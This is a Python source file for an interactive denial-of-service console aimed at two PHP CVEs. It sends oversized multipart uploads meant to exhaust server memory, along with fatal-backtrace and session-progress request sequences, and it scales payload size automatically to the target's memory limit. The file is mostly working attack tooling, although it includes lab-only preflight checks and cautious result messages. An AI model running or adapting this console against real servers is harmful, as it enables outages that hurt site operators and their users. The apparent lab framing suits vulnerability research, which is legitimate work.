#!/usr/bin/env python3
"""Interactive DoS console for PHP CVE-2026-109618 / CVE-2026-109619."""

import json
import shlex
import sys
import time
from http.cookies import CookieError, SimpleCookie
from pathlib import Path

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        pass

from attacker import (
    BOUNDARY, parse_target, endpoint_path, send,
    multipart_part_headers, multipart_empty_files, multipart_form_value,
    multipart_files_registration,
)
from session_progress_probe import (
    multipart_producer, multipart_consumer,
    request as session_request,
)


def parse_php_size(s):
    s = str(s).strip()
    if s == '-1':
        return -1
    units = {'K': 1024, 'M': 1024**2, 'G': 1024**3}
    if s and s[-1].upper() in units:
        return int(s[:-1]) * units[s[-1].upper()]
    return int(s)


def human_size(n):
    for unit in ('B', 'KiB', 'MiB', 'GiB'):
        if abs(n) < 1024:
            return f"{n:.0f} {unit}" if n == int(n) else f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} TiB"


def has_oom_marker(body):
    """Recognize an explicit PHP memory-exhaustion response, not any fatal error."""
    body = str(body).lower()
    return "allowed memory size" in body and "exhausted" in body


def parse_lab_json(result):
    """Return an expected lab health document or a reason to stop the probe."""
    if result.get("http_status") != 200:
        return None, "health endpoint did not return HTTP 200"
    try:
        data = json.loads(result.get("body_prefix", ""))
    except (json.JSONDecodeError, TypeError, ValueError):
        return None, "health endpoint did not return valid JSON"
    if not isinstance(data, dict) or data.get("lab") != "official-cve-lab-v1":
        return None, "health endpoint is not the expected lab"
    return data, None


BANNER = r"""
  ____  _   _ ____                _ ____       ____
 |  _ \| | | |  _ \      _   _ _(_)  _ \  ___/ ___|
 | |_) | |_| | |_) |____| | | | '_ \| | |/ _ \\___ \
 |  __/|  _  |  __/_____|_|_| | | | | |_| (_) |___) |
 |_|   |_| |_|_|        \__,_|_| |_|____/ \___/|____/

  PHP CVE-2026-109618 / CVE-2026-109619  DoS Console

  target <url>        Set target (e.g. target 192.168.1.10:8088)
  health              Health check
  109618 [strategy]   OOM candidate (part-headers|empty-files|form-value)
  109619              Fatal-backtrace candidate (PHP 8.5)
  session             Session lifecycle probe (A->B full sequence)
  set                 Show settable parameters
  show                Show current config
  help                Full help
"""

HELP = """
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Observe CVE-2026-109618 OOM candidate
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Probe CVE-2026-109619 fatal-backtrace path (PHP 8.5)
  session                     Probe the CVE-2026-109619 Session lifecycle path
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
"""

SET_HELP = """
Settable parameters (auto-scaled on first health check):
  health <path>               Health endpoint (default: health.php)
  upload <path>               Upload endpoint (default: upload.php)
  producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
  consumer <path>             Explicit early consumer endpoint (must configure for 109619)
  seed <path>                 Session seed endpoint (default: session/session-seed.php)
  session-health <path>       Session health endpoint (default: session/health.php)
  session-upload <path>       Session upload endpoint (default: session/upload.php)
  part-headers <n>            Part header count for OOM (auto: 2x memory_limit / 100)
  empty-files <n>             Empty file count for OOM (auto: 2x memory_limit / 600)
  field-bytes <n>             Form value / pad size for OOM (auto: 2x memory_limit)
  timeout <seconds>           Request timeout (default: 60)
  expected-php <version>      Expected PHP version (default: 8.5.11)
"""


class Console:
    def __init__(self):
        self.target = None
        self.scheme = self.host = self.port = self.prefix = None
        self.endpoints = {
            "health": "health.php",
            "upload": "upload.php",
            "producer": "fatal-backtrace.php",
            "consumer": "health.php",
            "seed": "session/session-seed.php",
            "session-health": "session/health.php",
            "session-upload": "session/upload.php",
        }
        self.target_mem_limit = None
        self.target_post_max = None
        self.part_headers = 599_000
        self.empty_files = 59_000
        self.field_bytes = 8 * 1024 * 1024 - 256
        self.pad_kib = 1340
        self.field_name_kib = 700
        self.timeout = 60.0
        self.expected_php = "8.5.11"
        self.consumer_explicit = False

    def path(self, name):
        return endpoint_path(self.prefix, self.endpoints[name])

    def run(self):
        print(BANNER)
        if len(sys.argv) > 1:
            self.cmd_target(sys.argv[1])
        while True:
            try:
                line = input("\033[1;31mDoS>\033[0m ").strip().lstrip("﻿")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            parts = shlex.split(line)
            cmd = parts[0].lower()
            args = parts[1:]
            handler = {
                "target": self.cmd_target,
                "show": lambda *_: self.cmd_show(),
                "health": lambda *_: self.cmd_health(),
                "109618": self.cmd_109618,
                "109619": lambda *_: self.cmd_109619(),
                "session": lambda *_: self.cmd_session(),
                "set": self.cmd_set,
                "help": lambda *_: print(HELP),
                "exit": lambda *_: sys.exit(0),
                "quit": lambda *_: sys.exit(0),
            }.get(cmd)
            if handler is None:
                print(f"Unknown command: {cmd}. Type 'help' for commands.")
                continue
            try:
                handler(*args)
            except Exception as exc:
                print(f"\033[91mError: {exc}\033[0m")

    def _detect_mem_limit(self, body_prefix):
        try:
            data = json.loads(body_prefix)
        except (json.JSONDecodeError, ValueError, TypeError):
            return
        mem_str = data.get("memory_limit")
        post_str = data.get("post_max_size")
        if mem_str:
            try:
                mem = parse_php_size(mem_str)
                if mem > 0:
                    self.target_mem_limit = mem
            except (ValueError, TypeError):
                pass
        if post_str:
            try:
                post = parse_php_size(post_str)
                if post > 0:
                    self.target_post_max = post
            except (ValueError, TypeError):
                pass
        if not self.target_mem_limit:
            return
        mem = self.target_mem_limit
        post = self.target_post_max or 8 * 1024 * 1024
        self.timeout = max(self.timeout, 60.0)
        if post < mem * 2:
            budget = post - 256
            self.part_headers = max(budget // 14, 10_000)
            self.empty_files = max(budget // 140, 5_000)
            self.field_bytes = max(budget - 100, 1024)
            post_label = post_str or f"{human_size(post)} (assumed)"
            print(f"  \033[93mpost_max_size={post_label}, memory_limit={mem_str}\033[0m")
            print(f"  \033[93mAuto-fit within {human_size(post)}: "
                  f"part-headers={self.part_headers:,}, "
                  f"empty-files={self.empty_files:,}, "
                  f"field-bytes={human_size(self.field_bytes)}\033[0m")
        else:
            self.field_bytes = mem * 2
            self.part_headers = max(mem // 100, 500_000)
            self.empty_files = max(mem // 600, 100_000)
            print(f"  \033[93mAuto-scaled payload to 2x {mem_str} ({human_size(self.field_bytes)})\033[0m")

    def require_target(self):
        if self.target is None:
            raise RuntimeError("No target set. Use: target <url>")

    def cmd_target(self, url=None):
        if url is None:
            if self.target:
                print(f"Current target: {self.target}")
            else:
                print("No target set. Usage: target <url>")
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        self.scheme, self.host, self.port, self.prefix = parse_target(url)
        self.target = url
        self.target_mem_limit = None
        self.target_post_max = None
        print(f"\033[92mTarget set: {self.scheme}://{self.host}:{self.port}{self.prefix}\033[0m")

    def cmd_show(self):
        print(f"  target:        {self.target or '(not set)'}")
        mem = human_size(self.target_mem_limit) if self.target_mem_limit else "(unknown)"
        post = human_size(self.target_post_max) if self.target_post_max else "(unknown)"
        print(f"  memory_limit:  {mem}")
        print(f"  post_max_size: {post}")
        for k, v in self.endpoints.items():
            print(f"  {k:16s} {v}")
        print(f"  part-headers:  {self.part_headers:,}")
        print(f"  empty-files:   {self.empty_files:,}")
        print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
        print(f"  timeout:       {self.timeout}s")
        print(f"  expected-php:  {self.expected_php}")

    def cmd_health(self):
        self.require_target()
        print(f"GET {self.path('health')} ...")
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path("health"), self.timeout, None, "health-check")
        if "transport_error" in result:
            print(f"\033[91m{result['transport_error']}\033[0m")
            return
        print(f"HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
        body_prefix = result.get("body_prefix", "")
        try:
            data = json.loads(body_prefix)
            print(f"  PHP:  {data.get('php')}")
            print(f"  SAPI: {data.get('sapi')}")
            print(f"  PID:  {data.get('pid')}")
            print(f"  Mem:  {data.get('memory_limit')}")
            print(f"  Post: {data.get('post_max_size')}")
            if self.target_mem_limit is None:
                self._detect_mem_limit(body_prefix)
        except json.JSONDecodeError:
            print(f"  Body: {body_prefix[:200]}")

    def cmd_109618(self, strategy=None):
        self.require_target()
        strategy = strategy or "part-headers"
        strategies = {
            "part-headers": lambda: multipart_part_headers(self.part_headers),
            "empty-files": lambda: multipart_empty_files(self.empty_files),
            "form-value": lambda: multipart_form_value(self.field_bytes),
            "files-registration": lambda: multipart_files_registration(
                self.pad_kib * 1024, self.field_name_kib * 1024),
        }
        if strategy not in strategies:
            print(f"Unknown strategy. Choose: {', '.join(strategies)}")
            return

        print(f"\033[93m[CVE-2026-109618] OOM candidate — {strategy}\033[0m")
        print("Step 1: Health check (baseline)...")
        baseline = send(self.scheme, self.host, self.port, "GET",
                        self.path("health"), self.timeout, None, "baseline")
        _, preflight_error = parse_lab_json(baseline)
        if preflight_error:
            print(f"  Preflight stopped: {preflight_error}")
            return
        pid_before = baseline.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
        if self.target_mem_limit is None:
            self._detect_mem_limit(baseline.get("body_prefix", ""))

        print(f"Generating payload (field-bytes={human_size(self.field_bytes)}, part-headers={self.part_headers:,})...")
        body = strategies[strategy]()
        print(f"Step 2: Sending {human_size(len(body))} multipart ({strategy})...")
        result = send(self.scheme, self.host, self.port, "POST",
                      self.path("upload"), self.timeout, None, "oom-candidate",
                      body, f"multipart/form-data; boundary={BOUNDARY}")
        if "transport_error" in result:
            print(f"  \033[91m{result['transport_error']}\033[0m")
        else:
            print(f"  HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
            body_text = result.get("body_prefix", "")
            if has_oom_marker(body_text):
                print(f"  \033[93mOOM response observed; CVE impact unconfirmed\033[0m")
            print(f"  Body: {body_text[:200]}")

        print("Step 3: Health check (after)...")
        after = send(self.scheme, self.host, self.port, "GET",
                     self.path("health"), self.timeout, None, "after")
        pid_after = after.get("worker_pid_header", "?")
        print(f"  PID: {pid_after}, HTTP {after.get('http_status', 'error')}")

        if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
            print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
        elif pid_before != "?" and pid_before == pid_after:
            print(f"  Health endpoint answered from the same PID: {pid_before}")
        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109618 DoS.")

    def cmd_109619(self):
        self.require_target()
        if (not self.consumer_explicit
                or self.path("consumer") == self.path("health")):
            print("  Preflight stopped: configure an explicit early consumer endpoint "
                  "with 'set consumer <path>'; health.php is not an early consumer.")
            return
        print(f"\033[93m[CVE-2026-109619] Fatal-backtrace candidate\033[0m")
        print("Step 1: Health check (baseline)...")
        baseline = send(self.scheme, self.host, self.port, "GET",
                        self.path("health"), self.timeout, None, "baseline")
        health, preflight_error = parse_lab_json(baseline)
        if preflight_error:
            print(f"  Preflight stopped: {preflight_error}")
            return
        if not self.expected_php.startswith("8.5.") or health.get("php") != self.expected_php:
            print(f"  Preflight stopped: PHP 8.5 exact version {self.expected_php} "
                  f"required; observed {health.get('php')!r}")
            return
        if health.get("sapi") != "apache2handler":
            print(f"  Preflight stopped: apache2handler required; "
                  f"observed {health.get('sapi')!r}")
            return
        if str(health.get("fatal_error_backtraces")) != "1":
            print("  Preflight stopped: fatal_error_backtraces is not enabled")
            return
        early_response = send(self.scheme, self.host, self.port, "GET",
                              self.path("consumer"), self.timeout, None,
                              "early-consumer-preflight")
        early_health, preflight_error = parse_lab_json(early_response)
        if preflight_error:
            print(f"  Preflight stopped: early consumer {preflight_error}")
            return
        if (early_health.get("php") != self.expected_php or
                early_health.get("sapi") != "apache2handler" or
                str(early_health.get("auto_detect_line_endings", "")).lower()
                not in ("1", "on")):
            print("  Preflight stopped: early consumer PHP/SAPI or INI diagnostic setting mismatch")
            return
        pid_before = baseline.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")

        print("Step 2: Fatal producer...")
        producer = send(self.scheme, self.host, self.port, "GET",
                        self.path("producer"), self.timeout, None, "fatal-producer")
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
            print("  Producer result is unconfirmed; consumer request skipped.")
            return
        else:
            print(f"  HTTP {producer.get('http_status', 'unknown')} "
                  f"({producer.get('elapsed_ms', '?')}ms)")
            producer_status = producer.get("http_status")
            if not isinstance(producer_status, int):
                print("  Producer response is incomplete; consumer request skipped.")
                return
            if producer_status < 500 and "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
                print("  No fatal producer response observed; consumer request skipped.")
                return
            if "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
                print("  HTTP error observed; the producer cause is unconfirmed from HTTP alone.")

        print("Step 3: Early consumer...")
        consumer = send(self.scheme, self.host, self.port, "GET",
                        self.path("consumer"), self.timeout, None, "early-consumer")
        if "transport_error" in consumer:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
            print("  Consumer transport error observed; worker status unconfirmed.")
        else:
            pid_after = consumer.get("worker_pid_header", "?")
            print(f"  PID: {pid_after}, HTTP {consumer['http_status']}")
            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")

    def cmd_session(self):
        self.require_target()
        print(f"\033[93m[CVE-2026-109619] Session lifecycle probe\033[0m")

        print("Step 1: Session health check...")
        health, _ = session_request(self.scheme, self.host, self.port, "GET",
                                    self.path("session-health"), timeout=self.timeout)
        if "transport_error" in health:
            print(f"  \033[91m{health['transport_error']}\033[0m")
            return
        health_data, preflight_error = parse_lab_json(health)
        if preflight_error:
            print(f"  Preflight stopped: {preflight_error}")
            return
        if health_data.get("php") != self.expected_php:
            print(f"  Preflight stopped: expected PHP {self.expected_php}, "
                  f"observed {health_data.get('php')!r}")
            return
        if health_data.get("sapi") != "apache2handler":
            print(f"  Preflight stopped: apache2handler required; "
                  f"observed {health_data.get('sapi')!r}")
            return
        if str(health_data.get("upload_progress")) != "1":
            print("  Preflight stopped: session upload progress is not enabled")
            return
        try:
            memory_limit = parse_php_size(health_data.get("memory_limit"))
            post_max_size = parse_php_size(health_data.get("post_max_size"))
            if memory_limit <= 0 or post_max_size <= 0:
                raise ValueError("limits must be positive")
        except (TypeError, ValueError):
            print("  Preflight stopped: positive memory_limit and post_max_size are required")
            return
        pid_before = health.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {health.get('http_status')}")
        self.target_mem_limit = memory_limit
        self.target_post_max = post_max_size
        self._detect_mem_limit(health.get("body_prefix", ""))

        print("Step 2: Acquiring session cookie...")
        seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
                                           self.path("seed"), timeout=self.timeout)
        if "transport_error" in seed:
            print(f"  \033[91m{seed['transport_error']}\033[0m")
            return
        if seed.get("http_status") != 200:
            print("  Preflight stopped: session seed endpoint did not return HTTP 200")
            return
        try:
            seed_data = json.loads(seed.get("body_prefix", ""))
        except (json.JSONDecodeError, TypeError, ValueError):
            seed_data = None
        if not isinstance(seed_data, dict) or seed_data.get("seeded") is not True:
            print("  Preflight stopped: session seed was not confirmed")
            return
        required_settings = ("upload_progress_enabled", "upload_progress_cleanup",
                             "use_only_cookies", "use_strict_mode")
        if any(str(seed_data.get(name)) != "1" for name in required_settings):
            print("  Preflight stopped: session seed settings do not match the lab profile")
            return
        session_name = seed_data.get("session_name")
        cookie_jar = SimpleCookie()
        try:
            if set_cookie:
                cookie_jar.load(set_cookie)
        except CookieError:
            pass
        if (not isinstance(session_name, str) or not session_name
                or session_name not in cookie_jar
                or not cookie_jar[session_name].value):
            print("  Preflight stopped: matching session cookie was not issued")
            return
        cookie = f"{session_name}={cookie_jar[session_name].value}"
        print(f"  Got session cookie")

        producer_body = multipart_producer(self.field_bytes, "candidate")
        print(f"Step 3: Producer (OOM with session progress, {human_size(len(producer_body))})...")
        producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=producer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
            print("  Producer result is unconfirmed; consumer request skipped.")
            return
        else:
            body_text = producer.get("body_prefix", "")
            print(f"  HTTP {producer.get('http_status')} ({producer.get('elapsed_ms')}ms)")
            if not has_oom_marker(body_text):
                print("  No explicit OOM response observed; consumer request skipped.")
                return
            print(f"  \033[93mOOM response observed\033[0m")

        consumer_body = multipart_consumer()
        print("Step 4: Consumer (session progress callback on stale state)...")
        consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=consumer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in consumer:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
            print("  Consumer transport error observed; worker status unconfirmed.")
        else:
            pid_after = consumer.get("worker_pid_header", "?")
            print(f"  PID: {pid_after}, HTTP {consumer.get('http_status')}")
            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
            elif pid_before != "?" and pid_before == pid_after:
                print(f"  Consumer answered from the baseline PID: {pid_before}")
        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")

    def cmd_set(self, key=None, value=None, *_):
        if key is None:
            print(SET_HELP)
            return
        if value is None:
            print(f"Usage: set {key} <value>")
            return
        if key in self.endpoints:
            self.endpoints[key] = value
            if key == "consumer":
                self.consumer_explicit = True
            print(f"  {key} = {value}")
        elif key == "part-headers":
            self.part_headers = int(value)
            print(f"  part-headers = {self.part_headers}")
        elif key == "empty-files":
            self.empty_files = int(value)
            print(f"  empty-files = {self.empty_files}")
        elif key == "field-bytes":
            self.field_bytes = int(value)
            print(f"  field-bytes = {self.field_bytes}")
        elif key == "timeout":
            self.timeout = float(value)
            print(f"  timeout = {self.timeout}s")
        elif key == "expected-php":
            self.expected_php = value
            print(f"  expected-php = {self.expected_php}")
        else:
            print(f"Unknown parameter: {key}")
            print(SET_HELP)


if __name__ == "__main__":
    Console().run()
